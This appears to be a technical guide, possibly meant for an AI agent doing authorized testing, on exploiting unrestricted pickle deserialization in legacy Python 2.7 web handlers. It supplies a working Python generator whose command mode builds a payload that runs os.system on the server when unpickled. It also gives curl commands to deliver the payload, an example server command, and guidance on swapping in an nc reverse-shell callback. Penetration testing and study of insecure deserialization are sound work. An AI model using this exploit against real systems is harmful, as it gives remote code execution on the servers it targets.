# Raw pickle over a verified request boundary

Use this for an established legacy Python 2.7 handler that decodes supplied bytes and calls unrestricted `pickle.loads`/`cPickle.loads`. This is different from Django's signed-cookie backend: do not add its salt/timestamp/signature to a route that consumes raw encoded pickle. Read acquired source as text and establish the effective request field/body, decoder, serializer, permitted object/schema and authentication before sending. A missing handler contract is a specific gap, not a reason to silently guess a form field.

Base64 is transport encoding, not integrity protection. `urlsafe_b64encode` substitutes `-`/`_` and still permits `=` padding. Keep required padding and distinguish that alphabet from standard base64 and outer form encoding. Python 2.7 `pickle.dumps` defaults to protocol 0 and supports up to protocol 2. Choose an explicit protocol the server accepts; a modern Python 3 default can exceed it. Even protocol 2 alone does not prove identical Python 2/3 string, callable-module or application semantics.

## Generate a selected artifact without loading it locally

Save this reviewed `build_pickle.py` in the private task directory and run with the entrypoint's established `python2_bin`. The marker mode serializes only an ordinary trusted dictionary; adapt those inert fields to the actual application's schema. The command mode is for an expressly authorized server-side execution check and reads an exact, bounded, reviewed command file. It serializes a reduce callable; it never calls `pickle.loads` locally:

~~~python
import os
import pickle
import sys
from base64 import urlsafe_b64encode

if len(sys.argv) == 2 and sys.argv[1] == 'marker':
    value = {'worker_probe': 'owned-pickle-marker'}
elif len(sys.argv) == 3 and sys.argv[1] == 'command':
    with open(sys.argv[2], 'rb') as source:
        command = source.read(4097)
    if not command or len(command) > 4096 or '\x00' in command:
        raise ValueError('need a nonempty reviewed command of at most 4096 bytes')
    class Probe(object):
        def __reduce__(self):
            return (os.system, (command,))
    value = Probe()
else:
    raise ValueError('use marker, or command with one reviewed command file')
sys.stdout.write(urlsafe_b64encode(pickle.dumps(value, protocol=2)))
~~~

Define `encoded` as a fresh private output path:

~~~bash
umask 077
(set -C; "$python2_bin" build_pickle.py marker >"$encoded")
~~~

Preserve status and complete encoded bytes. An inert object tests framing/application acceptance, not arbitrary-code execution. Do not unpickle acquired data to identify whether it is safe; static opcode inspection also is not a guarantee of safe loading. Pickling calls the supplied object's reduce method, so even a generator must be trusted code, not an acquired module executed blindly.

For the selected execution check, prepare `command_file` with only the agreed Linux action, for example `id > /absolute/server/task/identity.txt` at a fresh permitted server path. The command intentionally becomes server-side shell source, with that process's identity and filesystem/network access. Build with:

~~~bash
(set -C; "$python2_bin" build_pickle.py command "$command_file" >"$encoded")
~~~

Use a new encoded output instead of overwriting the marker artifact. Only server deserialization invokes the callable represented by REDUCE, potentially before a later schema check or exception. A class's local name need not exist on the server when its reduce representation names an available global callable, but the callable's module/name must resolve there. CPython 2.7's actual unrestricted REDUCE implementation calls `func(*args)`; do not interpret old “safe constructor” documentation as a security boundary in that loader.

## Deliver the actual container, then verify the effect

Define `url` as the selected route and `headers`/`response` as fresh captures. If verified source consumes the base64 text **directly from the raw POST body**, define `content_type` from that request contract and send exact file bytes:

~~~bash
curl --silent --show-error --connect-timeout 5 --max-time 30 \
  --header "Content-Type: $content_type" --data-binary "@$encoded" \
  --dump-header "$headers" --output "$response" \
  --write-out 'status=%{http_code}\n' "$url"
~~~

If it instead consumes a named form value, replace the header/data-binary pair with `--data-urlencode "$field_name@$encoded"` using the observed field. Do not apply both or percent-encode twice. Add the actual authentication/CSRF mechanism when required. These are conditional transport alternatives, not evidence that a particular application's endpoint uses either spelling.

Collect the selected marker through existing authorized access and tie it to this request. A returned system status, an HTTP 500, a marker file and an interactive callback establish different things. REDUCE can run and a later application step can still fail; inspect the effect before retrying. No effect can reflect decoding, incompatible protocol/global, no deserialization, restrictions, wrong path or permissions. Do not treat a generated token, listener connection or process prompt alone as completed execution or a privilege increase.

An expressly selected callback action can replace the command file's marker action when its endpoint, two-way receiver, nc implementation, shell/FIFO paths and child lifetime are established. A plain TCP stream lacks a PTY; adding a Unix PTY later changes terminal behavior, not the process's authority. Stop only the owned marker/session components through the established authorized access. Finish with the actual observed identity/effect and unresolved contract facts.

Resolve semantics with the pinned [Python 2.7 pickle documentation](https://github.com/python/cpython/blob/v2.7.18/Doc/library/pickle.rst), [actual REDUCE/global implementation](https://github.com/python/cpython/blob/v2.7.18/Lib/pickle.py), [base64 alphabet](https://github.com/python/cpython/blob/v2.7.18/Doc/library/base64.rst) and [curl body options](https://curl.se/docs/manpage.html).
